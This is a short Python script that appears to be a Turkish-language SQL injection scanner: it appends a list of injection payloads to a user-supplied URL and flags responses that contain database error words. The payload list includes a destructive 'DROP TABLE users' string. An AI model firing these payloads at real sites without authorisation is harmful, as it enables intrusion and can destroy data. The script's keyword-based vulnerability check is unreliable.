import requests
from rich.console import Console
from rich.table import Table

console = Console()

SQLI_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "' OR '1'='1'--", "' UNION SELECT NULL--",
    "1' AND '1'='1", "1' AND '1'='2", "1; DROP TABLE users--",
    "admin'--", "' OR 1=1#", "1' ORDER BY 1--", "1' ORDER BY 100--"
]


def run():
    url = console.input("[bold white]  Hedef URL (?id= ile): [/]").strip()
    if not url:
        console.print("[red]  URL bos olamaz.[/]")
        return

    console.print(f"[#818cf8]  SQL Injection testi: {url}[/]")

    table = Table(title="💉 SQL Injection Test", border_style="#818cf8", header_style="bold #a5b4fc")
    table.add_column("Payload", style="dim", min_width=25)
    table.add_column("Status", style="#a78bfa")
    table.add_column("Sonuc", style="bold")

    vulnerable = 0
    for payload in SQLI_PAYLOADS:
        test_url = url + payload if "?" in url else url + "?id=" + payload
        try:
            r = requests.get(test_url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
            errors = ["sql", "mysql", "syntax", "error", "warning", "query", "ORA-", "SQLite"]
            found = any(e.lower() in r.text.lower() for e in errors)
            if found:
                table.add_row(payload[:30], str(r.status_code), "[red]VULNERABLE[/]")
                vulnerable += 1
            else:
                table.add_row(payload[:30], str(r.status_code), "[green]Guvenli[/]")
        except Exception:
            table.add_row(payload[:30], "ERR", "[dim]Hata[/]")

    console.print()
    console.print(table)
    if vulnerable:
        console.print(f"\n[red]  {vulnerable} potansiyel zafiyet bulundu![/]")
    else:
        console.print(f"\n[green]  Zafiyet bulunamadi.[/]")
